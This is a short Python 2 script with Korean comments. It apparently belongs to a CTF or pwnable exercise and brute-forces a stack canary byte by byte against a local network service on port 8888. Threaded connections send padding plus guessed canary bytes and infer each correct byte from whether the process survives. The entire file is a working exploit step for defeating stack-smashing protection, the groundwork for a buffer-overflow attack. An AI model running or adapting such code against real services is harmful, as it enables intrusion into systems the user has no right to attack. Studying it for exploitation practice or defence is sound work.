#-*-coding: utf-8-*-
'''python2
CPU 자원을 꽤 많이 차지함. c9에서 150%까지 로드해버린다.
그래도 timeout은 거의 일어나지 않는다. asyncio_sock / stream와 대조적.
'''

import threading
import socket
from struct import pack, unpack

##########################################
def u32(x):
    return unpack('<L', x)[0]
    
def p32(x):
    return pack('<L', x)

def p8(x):
    return pack('B', x)

def recvuntil(self, delim):
    res = ''
    while True:
        res += self.recv(4096)
        offset = res.find(delim)
        if offset != -1:
            return res[:offset+len(delim)]
socket.socket.recvuntil = recvuntil
###########################################
            

HOST = "127.0.0.1"
PORT = 8888

shared_data = [0 for i in range(4)]


def break_canary(i, x):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 8888))
    s.settimeout(5)
    
    try:
        s.recvuntil(">")
        s.sendall('4')
        s.recvuntil("(y/n) ")
    except socket.timeout:
        print "x : {}    timeout    ".format(hex(x))
    
    # Lock 안걸어도 잘 된다. 왜?
    with threading.Lock():
        payload = '1'*0xa
        for j in range(i):
            payload += p8(shared_data[j])
        payload += p8(x)
        s.sendall(payload)
    
        is_alive = s.recv(4096)
        if len(is_alive) != 0:
            print "{} is {} th byte".format(hex(x), i)
            shared_data[i] = x
    
    s.close()


def main():
    range_pack = [range(0x80), range(0x80, 0x100)]
    for i in range(1, 4):
        for ran in range_pack:
            for x in ran:
                t = threading.Thread(target=break_canary, args=(i, x, ))
                t.start()
            while threading.active_count() != 1:
                pass
            if shared_data[i] != 0:
                break
            
    
if __name__ == "__main__":
    main()
    
    